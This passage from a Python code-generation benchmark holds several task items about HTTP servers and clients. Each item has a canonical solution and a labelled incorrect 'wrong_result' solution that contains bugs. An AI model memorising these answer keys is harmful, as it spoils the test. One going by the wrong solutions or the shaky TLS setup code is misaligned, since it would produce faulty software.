redirect=True, assert_same_host=True, timeout=Timeout.DEFAULT_TIMEOUT, pool_timeout=None, release_conn=None, **response_kw):\n        pass\n\n    def close(self):\n        while not self.pool.empty():\n            conn = self.pool.get()\n            conn.close()\n\nclass HTTPSConnectionPool(HTTPConnectionPool):\n    def __init__(self, host, port=None, key_file=None, cert_file=None, cert_reqs='CERT_REQUIRED', ca_certs=None, ssl_version=ssl.PROTOCOL_TLSv1, assert_hostname=True, assert_fingerprint=None, **kwargs):\n        super().__init__(host, port, **kwargs)\n        self.key_file = key_file\n        self.cert_file = cert_file\n        self.cert_reqs = cert_reqs\n        self.ca_certs = ca_certs\n        self.ssl_version = ssl_version\n        self.assert_hostname = assert_hostname\n        self.assert_fingerprint = assert_fingerprint\n\n    def _prepare_conn(self, conn):\n        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n        context.verify_mode = ssl.CERT_REQUIRED\n        context.check_hostname = self.assert_hostname\n        if self.key_file and self.cert_file:\n            context.load_cert_chain(self.cert_file, keyfile=self.key_file)\n        if self.ca_certs:\n            context.load_verify_locations(cafile=self.ca_certs)\n        if self.ssl_version:\n            context.options |= self.ssl_version\n        conn.sock = context.wrap_socket(conn.sock, server_hostname=self.host)\n        return conn\n\n    def _new_conn(self):\n        return HTTPSConnection(self.host, self.port)"
  },
  {
    "Task_id": 217,
    "Instruction": "Task Description: Create a Python HTTP server for testing purposes that can handle GET and POST requests, serve static and dynamic files, and support features like range requests and gzip compression.\n\nClass Description: HTTPTestHandler is a custom request handler class that extends BaseHTTPRequestHandler to implement specific HTTP request handling logic for testing scenarios.\n\nAttributes:\n- static_files: dict - A dictionary mapping file paths to their static content (bytes)\n- dynamic_files: dict - A dictionary for storing dynamically created file content (bytes)\n- files: ChainMap - A combined view of both static_files and dynamic_files dictionaries\n\nMethods:\n- _respond(code=200, headers=None, data=b\"\"): None - Helper method to send HTTP responses\n  Input:\n    - code: int - HTTP status code (default: 200)\n    - headers: dict - Response headers (default: None)\n    - data: bytes - Response body (default: empty bytes)\n  Output: None (sends response directly to client)\n\n- do_GET(): None - Handles HTTP GET requests\n  Input: None (uses self.path and self.headers from the request)\n  Output: None (sends response directly to client)\n\n- do_POST(): None - Handles HTTP POST requests\n  Input: None (uses self.path, self.headers, and request body)\n  Output: None (sends response directly to client)\n\n- read_chunks(): generator - Helper method to read chunked transfer encoding\n  Input: None\n  Output: generator yielding bytes - The chunks of data from the request body\n\nContext Manager:\n- serve(): contextmanager - Creates and manages an HTTP server in a separate thread\n  Input: None\n  Output: generator yielding str - The server URL (e.g., \"http://localhost:12345\")\n  Note: Automatically cleans up server resources when context exits",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport threading\nimport contextlib\nimport json\nimport gzip\nfrom collections import ChainMap\n\nclass HTTPTestHandler(BaseHTTPRequestHandler):\n    static_files = {\n        \"/index/realfile\": b\"\\n\".join([b\"some test data\"] * 1000),\n        \"/index/otherfile\": b\"\\n\".join([b\"some test data\"] * 1000),\n        \"/data/20020401\": b'<a href=\"http://testserver/index/realfile\">Link</a>',\n    }\n    dynamic_files = {}\n    files = ChainMap(dynamic_files, static_files)\n\n    def _respond(self, code=200, headers=None, data=b\"\"):\n        headers = headers or {}\n        headers.update({\"User-Agent\": \"test\"})\n        self.send_response(code)\n        for k, v in headers.items():\n            self.send_header(k, str(v))\n        self.end_headers()\n        if data:\n            self.wfile.write(data)\n\n    def do_GET(self):\n        file_path = self.path\n        if file_path.endswith(\"/\") and file_path.rstrip(\"/\") in self.files:\n            file_path = file_path.rstrip(\"/\")\n        file_data = self.files.get(file_path)\n        \n        if \"give_path\" in self.headers:\n            return self._respond(200, data=json.dumps({\"path\": self.path}).encode())\n        if file_data is None:\n            return self._respond(404)\n\n        status = 200\n        if \"Range\" in self.headers and \"ignore_range\" not in self.headers:\n            ran = self.headers[\"Range\"]\n            b, ran = ran.split(\"=\")\n            start, end = ran.split(\"-\")\n            if start:\n                file_data = file_data[int(start) : (int(end) + 1) if end else None]\n            else:\n                l = len(file_data)\n                file_data = file_data[-int(end) :]\n            if \"use_206\" in self.headers:\n                status = 206\n\n        if \"give_length\" in self.headers:\n            if \"gzip_encoding\" in self.headers:\n                file_data = gzip.compress(file_data)\n                response_headers = {\n                    \"Content-Length\": len(file_data),\n                    \"Content-Encoding\": \"gzip\",\n                }\n            else:\n                response_headers = {\"Content-Length\": len(file_data)}\n            self._respond(status, response_headers, file_data)\n        else:\n            self._respond(status, data=file_data)\n\n    def do_POST(self):\n        length = self.headers.get(\"Content-Length\")\n        file_path = self.path.rstrip(\"/\")\n        if length is None:\n            assert self.headers.get(\"Transfer-Encoding\") == \"chunked\"\n            self.files[file_path] = b\"\".join(self.read_chunks())\n        else:\n            self.files[file_path] = self.rfile.read(int(length))\n        self._respond(200)\n\n    def read_chunks(self):\n        length = -1\n        while length != 0:\n            line = self.rfile.readline().strip()\n            if len(line) == 0:\n                length = 0\n            else:\n                length = int(line, 16)\n            yield self.rfile.read(length)\n            self.rfile.readline()\n\n@contextlib.contextmanager\ndef serve():\n    server_address = (\"\", 0)\n    httpd = HTTPServer(server_address, HTTPTestHandler)\n    th = threading.Thread(target=httpd.serve_forever)\n    th.daemon = True\n    th.start()\n    try:\n        yield f\"http://{httpd.server_name}:{httpd.server_port}\"\n    finally:\n        httpd.socket.close()\n        httpd.shutdown()\n        th.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import socketserver\nimport threading\nimport gzip\nimport io\nfrom collections import ChainMap\n\nclass HTTPTestHandler(socketserver.BaseHTTPRequestHandler):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.static_files = {}\n        self.dynamic_files = {}\n        self.files = ChainMap(self.static_files, self.dynamic_files)\n\n    def _respond(self, code=200, headers=None, data=b\"\"):\n        if headers is None:\n            headers = {}\n        self.send_response(code)\n        for k, v in headers.items():\n            self.send_header(k, v)\n        self.end_headers()\n        self.wfile.write(data)\n\n    def do_GET(self):\n        path = self.path\n        data = self.files.get(path, None)\n        if data is None:\n            self._respond(404)\n            return\n\n        if 'Range' in self.headers:\n            range_header = self.headers['Range']\n            if not range_header.startswith('bytes='):\n                self._respond(416, {'Content-Range': f'bytes */{len(data)}'}, b'')\n                return\n\n            range_str = range_header[6:]\n            if '-' in range_str:\n                start, end = map(int, range_str.split('-'))\n            else:\n                start = int(range_str)\n                end = len(data) - 1\n\n            if start > len(data) - 1 or end >= len(data) or start > end:\n                self._respond(416, {'Content-Range': f'bytes */{len(data)}'}, b'')\n                return\n\n            data = data[start:end+1]\n            self.send_header('Content-Range', f'bytes {start}-{end}/{len(data)}')\n            self.send_header('Content-Length', str(len(data)))\n            self.send_header('HTTP/1.1', '206 Partial Content')\n            self.end_headers()\n            self.wfile.write(data)\n            return\n\n        accept_encoding = self.headers.get('Accept-Encoding', '')\n        if 'gzip' in accept_encoding:\n            compressed_data = gzip.compress(data)\n            self.send_header('Content-Encoding', 'gzip')\n            self.send_header('Content-Length', str(len(compressed_data)))\n        else:\n            self.send_header('Content-Length', str(len(data)))\n\n        self.send_header('Content-Type', 'text/plain')\n        self.end_headers()\n        self.wfile.write(data)\n\n    def do_POST(self):\n        content_length = int(self.headers.get('Content-Length', 0))\n        data = self.rfile.read(content_length)\n        self._respond(200, {}, data)\n\n    def read_chunks(self):\n        while True:\n            chunk = self.rfile.read(1024)\n            if not chunk:\n                break\n            yield chunk\n\ndef serve():\n    import socketserver\n    import threading\n\n    class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n        pass\n\n    server_address = ('', 12345)\n    httpd = ThreadedHTTPServer(server_address, HTTPTestHandler)\n    thread = threading.Thread(target=httpd.serve_forever)\n    thread.start()\n    try:\n        yield \"http://localhost:12345\"\n    finally:\n        httpd.shutdown()\n        thread.join()"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for testing purposes, allowing communication between a test suite and a web browser through queues, and handling HTML snippet transmission.\n\nClass Description: The class should implement a custom HTTP server that can receive HTML snippets from a test suite and serve them to a web browser, while also facilitating bidirectional communication between the test suite and server using thread-safe queues.\n\nAttributes:\n\nLOCAL_IP: [str] - The local IP address to bind the server to (default: '127.0.0.1')\nPORT: [int] - The port number to run the server on (default: 28546)\nREQUEST_HANDLER_CLASS: [class] - The custom request handler class to use (default: HTMLSnippetSender)\nto_server_queue: [Queue] - Queue for sending data from test suite to server\nfrom_server_queue: [Queue] - Queue for receiving data from server to test suite\nserver: [HTTPServer] - The HTTP server instance\nserver_thread: [Thread] - Thread running the server\n\nMethods:\n\nsetUpClass: [classmethod]() -> None - Class method to initialize the server and queues before tests\ntearDownClass: [classmethod]() -> None - Class method to clean up server resources after tests\nsend_to_server: [method](value: Any) -> None - Sends data to the server through the input queue\nrecv_from_server: [method](non_blocking: bool = False) -> Any - Receives data from server through output queue (optionally non-blocking)\nopen_url: [method](path: str) -> None - Constructs and opens a URL to the test server in the browser\n\nHTMLSnippetSender Class Description: A custom HTTP request handler that manages HTML snippet transmission between server and browser.\n\nAttributes:\n\nlast_html: [bytes] - Buffer storing the last received HTML snippet\n\nMethods:\n\ndo_GET: [method]() -> None - Handles GET requests, serving the last HTML snippet for root path\nget_last_html: [method]() -> bytes - Retrieves the most recent HTML snippet from the queue\nrecv_from_testsuite: [method](non_blocking: bool = False) -> Any - Receives data from test suite queue (optionally non-blocking)\nsend_to_testsuite: [method](value: Any) -> None - Sends data to test suite through output queue\nlog_request: [method](code: str = '-', size: str = '-') -> None - Overrides default request logging (empty implementation)",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom queue import Queue\nfrom threading import Thread\nfrom urllib.parse import urlunsplit\n\nclass HTMLSnippetSender(BaseHTTPRequestHandler):\n    last_html = b''\n\n    def get_last_html(self):\n        while True:\n            value = self.recv_from_testsuite(non_blocking=True)\n            if value is None:\n                break\n            self.last_html = value\n        return self.last_html\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-Type', 'text/html; charset=utf-8')\n            self.end_headers()\n            self.wfile.write(self.get_last_html().encode('utf-8'))\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n    def recv_from_testsuite(self, non_blocking=False):\n        q = self.server.in_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def send_to_testsuite(self, value):\n        self.server.out_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\nclass BaseBrowserTest:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    @classmethod\n    def setUpClass(cls):\n        cls.to_server_queue = Queue()\n        cls.from_server_queue = Queue()\n        cls.server = HTTPServer((cls.LOCAL_IP, cls.PORT),\n                              cls.REQUEST_HANDLER_CLASS)\n        cls.server.in_queue = cls.to_server_queue\n        cls.server.out_queue = cls.from_server_queue\n        cls.server_thread = Thread(target=cls.server.serve_forever)\n        cls.server_thread.daemon = True\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server.server_close()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        q = self.from_server_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def open_url(self, path):\n        self.driver.get(urlunsplit(\n            ('http', '{}:{}'.format(\n                self.LOCAL_IP, self.PORT), path, '', '')))",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import socketserver\nimport http.server\nimport threading\nimport queue\nimport webbrowser\n\nclass HTMLSnippetSender(http.server.BaseHTTPRequestHandler):\n    def __init__(self, to_server_queue, from_server_queue, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.to_server_queue = to_server_queue\n        self.from_server_queue = from_server_queue\n        self.last_html = b''\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(self.last_html)\n        else:\n            self.send_error(404, 'File not found')\n\n    def get_last_html(self):\n        return self.last_html\n\n    def recv_from_testsuite(self, non_blocking=False):\n        if non_blocking:\n            try:\n                return self.to_server_queue.get_nowait()\n            except queue.Empty:\n                return None\n        else:\n            return self.to_server_queue.get()\n\n    def send_to_testsuite(self, value):\n        self.from_server_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\nclass TestServer:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    def __init__(self):\n        self.to_server_queue = queue.Queue()\n        self.from_server_queue = queue.Queue()\n        self.server = None\n        self.server_thread = None\n\n    @classmethod\n    def setUpClass(cls):\n        test_server = TestServer()\n        handler = cls.REQUEST_HANDLER_CLASS(test_server.to_server_queue, test_server.from_server_queue)\n        cls.server = http.server.HTTPServer((cls.LOCAL_IP, cls.PORT), handler)\n        cls.server_thread = threading.Thread(target=cls.server.serve_forever)\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server_thread.join()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        if non_blocking:\n            try:\n                return self.from_server_queue.get_nowait()\n            except queue.Empty:\n                return None\n        else:\n            return self.from_server_queue.get()\n\n    def open_url(self, path):\n        url = f'http://{self.LOCAL_IP}:{self.PORT}{path}'\n        webbrowser.open(url)"
  },
  {
    "Task_id": 219,
    "Instruction": "Task Description: Create a Python HTTP server that handles POST requests, processes JSON data, and returns a modified JSON response. The server should be implemented using Python's built-in http.server module with customizable port and request handler.\n\nClass Description: The solution consists of two classes: PostHandler (request handler) and HTTPServerWrapper (server manager). PostHandler processes incoming POST requests and their JSON data, while HTTPServerWrapper manages the server lifecycle.\n\nAttributes:\n- port: int - The port number on which the HTTP server will listen (default: 8888)\n- handler_class: class - The request handler class to be used (default: PostHandler)\n- server_address: tuple - A tuple containing the server address and port\n- httpd: HTTPServer - The HTTP server instance\n\nMethods:\n- PostHandler.do_POST() -> None - Handles incoming POST requests, reads JSON data, processes it, and sends back a JSON response\n- PostHandler.process_data(data: dict) -> dict - Processes the incoming JSON data (can be overridden for custom processing)\n- HTTPServerWrapper.__init__(port: int = 8888, handler_class: class = PostHandler) -> None - Initializes the server with specified port and handler\n- HTTPServerWrapper.run() -> None - Starts the HTTP server and begins serving requests indefinitely",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\n\nclass PostHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        json_data = json.loads(post_data)\n\n        new_json_data = self.process_data(json_data)\n\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(json.dumps(new_json_data).encode('utf-8'))\n\n    def process_data(self, data):\n        return data\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8888, handler_class=PostHandler):\n        self.port = port\n        self.handler_class = handler_class\n        self.server_address = ('', self.port)\n        self.httpd = HTTPServer(self.server_address, self.handler_class)\n\n    def run(self):\n        print('Starting httpd on port {}'.format(self.port))\n        self.httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport json\n\nclass PostHandler(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        data = self.rfile.read(content_length)\n        json_data = json.loads(data)\n        processed = self.process_data(json_data)\n        self.send_response(200)\n        self.send_header('Content-Type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps(processed).encode('utf-8'))\n\n    def process_data(self, data):\n        data['processed'] = True\n        return data\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8888, handler_class=PostHandler):\n        self.port = port\n        self.handler_class = handler_class\n        self.server_address = ('', port)\n        self.httpd = http.server.HTTPServer(self.server_address, self.handler_class)\n\n    def run(self):\n        self.httpd.serve_forever()"
  },
  {
    "Task_id": 22,
    "Instruction": "Task Description: Implement a class for handling HTTP requests to a server, supporting both GET and POST methods, with optional proxy support and response parsing capabilities.\n\nClass Description: WARequest is a class designed to facilitate HTTP communication with a server. It provides methods for sending GET and POST requests, handling response parsing, and managing request parameters and headers. The class supports both direct connections and proxy connections.\n\nAttributes:\n\npvars: [list] - List of variables that can be parsed from the response\nport: [int] - Port number for the HTTP connection (default: 443)\ntype: [str] - HTTP request type (GET or POST)\nparser: [ResponseParser] - Parser object for processing the response\nparams: [list] - List of tuples containing request parameters\nheaders: [dict] - Dictionary of HTTP headers to be sent with the request\nsent: [bool] - Flag indicating if the request has been sent\nresponse: [HTTPResponse] - The response object from the server\nurl: [str] - The target URL for the request\n\nMethods:\n\nsetParsableVariables: [setParsableVariables](pvars: list) -> None - Sets the list of variables that can be parsed from the response\naddParam: [addParam](name: str, value: str) -> None - Adds a parameter to the request\nremoveParam: [removeParam](name: str) -> None - Removes a parameter from the request\naddHeaderField: [addHeaderField](name: str, value: str) -> None - Adds a header field to the request\nclearParams: [clearParams]() -> None - Clears all request parameters\ngetUserAgent: [getUserAgent]() -> str - Returns the user agent string\nsend: [send](parser: ResponseParser = None) -> dict - Sends the request (GET or POST based on type) and returns parsed response\nsetParser: [setParser](parser: ResponseParser) -> None - Sets the response parser\ngetConnectionParameters: [getConnectionParameters]() -> tuple - Returns host, port, and path from the URL\nsendGetRequest: [sendGetRequest](parser: ResponseParser = None) -> dict - Sends a GET request and returns parsed response\nsendPostRequest: [sendPostRequest](parser: ResponseParser = None) -> dict - Sends a POST request and returns parsed response\nsendRequest: [sendRequest](host: str, port: int, path: str, headers: dict, params: list, reqType: str = \"GET\") -> HTTPResponse - Static method to send a direct HTTP request\nsendRequestWithProxy: [sendRequestWithProxy](host: str, port: int, path: str, headers: dict, params: list, proxy: HttpProxy) -> dict - Static method to send a request through a proxy\nbuild_get_url: [build_get_url](host: str, path: str, params: list) -> str - Static method to build a GET URL\nbuild_headers: [build_headers](headers_tuple: dict) -> list - Static method to convert headers dictionary to curl format",
    "Canonical_solution": "import urllib\nimport sys\nimport os\nimport logging\nfrom http import client as httplib\nfrom urllib.parse import urlencode\nfrom .httpproxy import HttpProxy\nfrom yowsup.env import YowsupEnv\n\nlogger = logging.getLogger(__name__)\n\nclass WARequest:\n    OK = 200\n\n    def __init__(self):\n        self.pvars = []\n        self.port = 443\n        self.type = \"GET\"\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        for i in range(0, len(self.params)):\n            if self.params[i][0] == name:\n                del self.params[i]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params = []\n\n    def getUserAgent(self):\n        return YowsupEnv.getCurrent().getUserAgent()\n\n    def send(self, parser=None):\n        if self.type == \"POST\":\n            return self.sendPostRequest(parser)\n        return self.sendGetRequest(parser)\n\n    def setParser(self, parser):\n        if isinstance(parser, ResponseParser):\n            self.parser = parser\n        else:\n            logger.error(\"Invalid parser\")\n\n    def getConnectionParameters(self):\n        if not self.url:\n            return \"\", \"\", self.port\n\n        try:\n            url = self.url.split(\"://\", 1)\n            url = url[0] if len(url) == 1 else url[1]\n            host, path = url.split('/', 1)\n        except ValueError:\n            host = url\n            path = \"\"\n\n        path = \"/\" + path\n        return host, self.port, path\n\n    def sendGetRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta()\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        proxy = HttpProxy.getFromEnviron()\n        if proxy is None:\n            self.response = WARequest.sendRequest(host, port, path, headers, params, \"GET\")\n            if not self.response.status == WARequest.OK:\n                logger.error(\"Request not success, status was %s\" % self.response.status)\n                return {}\n\n            data = self.response.read()\n            logger.info(data)\n            self.sent = True\n            return parser.parse(data.decode(), self.pvars)\n        else:\n            logger.info(\"Request with proxy\")\n            self.response = WARequest.sendRequestWithProxy(host, port, path, headers, params, proxy)\n            logger.info(self.response)\n            return self.response\n\n    def sendPostRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta(),\n                           \"Content-Type\": \"application/x-www-form-urlencoded\"\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        self.response = WARequest.sendRequest(host, port, path, headers, params, \"POST\")\n\n        if not self.response.status == WARequest.OK:\n            logger.error(\"Request not success, status was %s\" % self.response.status)\n            return {}\n\n        data = self.response.read()\n        logger.info(data)\n        self.sent = True\n        return parser.parse(data.decode(), self.pvars)\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType=\"GET\"):\n        params = urlencode(params)\n        path = path + \"?\" + params if reqType == \"GET\" and params else path\n\n        if len(headers):\n            logger.debug(headers)\n        if len(params):\n            logger.debug(params)\n\n        logger.debug(\"Opening connection to %s\" % host)\n        conn = httplib.HTTPSConnection(host, port) if port == 443 else httplib.HTTPConnection(host, port)\n\n        logger.debug(\"Sending %s request to %s\" % (reqType, path))\n        conn.request(reqType, path, params, headers)\n        response = conn.getresponse()\n        return response\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        import pycurl\n        import json\n        from io import BytesIO\n        logger.info(\"SENDING PROXY REQUEST WITH %s\" % proxy.getHost())\n        bytes_buffer = BytesIO()\n        c = pycurl.Curl()\n        c.setopt(pycurl.URL, WARequest.build_get_url(host, path, params))\n        c.setopt(pycurl.PROXY, proxy.getHost())\n        c.setopt(pycurl.PROXYPORT, proxy.getPort())\n        if proxy.getUserName() is not None:\n            c.setopt(pycurl.PROXYUSERPWD, \"%s:%s\" % (proxy.getUser(), proxy.getPassword()))\n        c.setopt(pycurl.PORT, port)\n        c.setopt(pycurl.HTTPHEADER, WARequest.build_headers(headers))\n        c.setopt(pycurl.WRITEDATA, bytes_buffer)\n        c.perform()\n        c.close()\n        data = bytes_buffer.getvalue().decode('utf-8')\n        return json.loads(data)\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        params = urlencode(params)\n        url = 'https://' + host + path + \"?\" + params\n        return url\n\n    @staticmethod\n    def build_headers(headers_tuple):\n        headers_array = []\n        for idx in headers_tuple:\n            headers_array.append(idx + \":\" + headers_tuple[idx])\n        return headers_array",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nfrom urllib.parse import urlparse\n\nclass WARequest:\n    def __init__(self, url, type='GET', port=443):\n        self.url = url\n        self.type = type\n        self.port = port\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n        self.pvars = []\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        self.params = [(k, v) for k, v in self.params if k != name]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params = []\n\n    def getUserAgent(self):\n        return \"MyApp/1.0\"\n\n    def send(self, parser=None):\n        if parser is None:\n            parser = ResponseParser()\n        self.setParser(parser)\n        if self.type == 'GET':\n            self.sendGetRequest(parser)\n        else:\n            self.sendPostRequest(parser)\n        return self.parser.parse(self.response)\n\n    def setParser(self, parser):\n        self.parser = parser\n\n    def getConnectionParameters(self):\n        parsed = urlparse(self.url)\n        host = parsed.hostname\n        path = parsed.path\n        return (host, self.port, path)\n\n    def sendGetRequest(self, parser=None):\n        host, port, path = self.getConnectionParameters()\n        url = self.build_get_url(host, path, self.params)\n        headers = self.build_headers(self.headers)\n        self.response = requests.get(url, headers=headers)\n        self.sent = True\n\n    def sendPostRequest(self, parser=None):\n        host, port, path = self.getConnectionParameters()\n        url = self.build_get_url(host, path, self.params)\n        headers = self.build_headers(self.headers)\n        self.response = requests.post(url, headers=headers)\n        self.sent = True\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType='GET'):\n        url = WARequest.build_get_url(host, path, params)\n        if reqType == 'GET':\n            response = requests.get(url, headers=headers)\n        else:\n            response = requests.post(url, headers=headers)\n        return response\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        proxies = {'http': f'http://{proxy.host}:{proxy.port}', 'https': f'https://{proxy.host}:{proxy.port}'}\n        url = WARequest.build_get_url(host, path, params)\n        if headers:\n            response = requests.get(url, headers=headers, proxies=proxies)\n        else:\n            response = requests.get(url, proxies=proxies)\n        return response\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        query_params = '&'.join([f\"{k}={v}\" for k, v in params])\n        return f\"{host}{path}?{query_params}\"\n\n    @staticmethod\n    def build_headers(headers_tuple):\n        return [f\"{k}: {v}\" for k, v in headers_tuple.items()]"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the `http.server` module to handle GET and POST requests, with custom response handling and error management.\n\nClass Description: The `YamlComposerHttp` class encapsulates an HTTP server that listens on a specified port and handles incoming GET and POST requests. It includes an inner class `_HttpServer` that extends `BaseHTTPRequestHandler` to define custom request handling logic.\n\nAttributes:\n\n- args: [object] - Configuration object containing server parameters, including the HTTP port to listen on.\n\nMethods:\n\n- __init__(args) -> None - Initializes the `YamlComposerHttp` instance with the provided configuration.\n  - Input: \n    - args: [object] - Configuration object containing server parameters.\n  - Output: None\n\n- run() -> None - Starts the HTTP server and begins listening for incoming requests indefinitely until interrupted.\n  - Input: None\n  - Output: None\n\nInner Class: _HttpServer(BaseHTTPRequestHandler)\n\nMethods:\n\n- _set_response(msg: str, code: int = 200) -> None - Helper method to send an HTTP response with the specified message and status code.\n  - Input:\n    - msg: [str] - The message to include in the response body.\n    - code: [int] - The HTTP status code (default: 200).\n  - Output: None\n\n- do_GET() -> None - Handles incoming GET requests. Responds with a default HTML page for the root path ('/') or an error for invalid paths.\n  - Input: None\n  - Output: None\n\n- do_POST() -> None - Handles incoming POST requests. Processes form data from '/generate' path or returns an error for invalid paths.\n  - Input: None\n  - Output: None",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import parse_qs\n\nclass YamlComposerHttp:\n    def __init__(self, args):\n        self.args = args\n\n    class _HttpServer(BaseHTTPRequestHandler):\n        def _set_response(self, msg: str, code: int = 200):\n            self.send_response(code)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(msg.encode('utf-8'))\n\n        def do_GET(self):\n            if str(self.path) != '/':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            self._set_response(self.default_html)\n\n        def do_POST(self):\n            if str(self.path) != '/generate':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            content_length = int(self.headers['Content-Length'])\n            data = self.rfile.read(content_length)\n            data = {k: v[0] for k, v in parse_qs(data.decode('utf-8')).items()}\n            self._set_response(*parse_http_data(data, self.args))\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.args.http_port), self._HttpServer)\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            httpd.server_close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\n\nclass YamlComposerHttp:\n    def __init__(self, args):\n        self.args = args\n        self.port = args.port\n\n    def run(self):\n        server_address = ('', self.port)\n        httpd = http.server.HTTPServer(server_address, self._HttpServer)\n        print(f'Serving at port {self.port}')\n        httpd.serve_forever()\n\n    class _HttpServer(http.server.BaseHTTPRequestHandler):\n        def _set_response(self, msg: str, code: int = 200) -> None:\n            self.send_response(code)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(msg.encode('utf-8'))\n\n        def do_GET(self) -> None:\n            if self.path == '/':\n                self._set_response(\"Welcome to YamlComposerHttp\")\n            else:\n                self._set_response(\"Not Found\", 404)\n\n        def do_POST(self) -> None:\n            if self.path == '/generate':\n                content_length = int(self.headers['Content-Length'])\n                post_data = self.rfile.read(content_length)\n                self._set_response(f\"Form data received: {post_data.decode()}\")\n            else:\n                self._set_response(\"Method Not Allowed\", 405)"
  },
  {
    "Task_id": 221,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server capable of handling POST requests to receive and process file uploads with metadata, then store the files locally and register them via an API.\n\nClass Description: HTTPPostHandler is a class that sets up an HTTP server to handle file uploads via POST requests. It processes JSON payloads containing file data (base64 encoded), metadata, and stores the decoded files in a specified directory while registering them through an external API.\n\nAttributes:\n- OUTPUT_DIR: str - The base directory where uploaded files will be stored\n- port: int - The port number on which the HTTP server will listen\n\nMethods:\n- __init__(output_dir: str = '', port: int = 80) -> None - Initializes the HTTPPostHandler with optional output directory and port parameters\n- run() -> None - Starts the HTTP server and begins listening for requests indefinitely\n\nNested Class: Handler (extends BaseHTTPRequestHandler)\nMethods:\n- _set_headers() -> None - Sets the HTTP response headers for successful requests\n- do_POST() -> None - Handles POST requests, processes the incoming file data and metadata, saves the file to disk, and registers it via API",
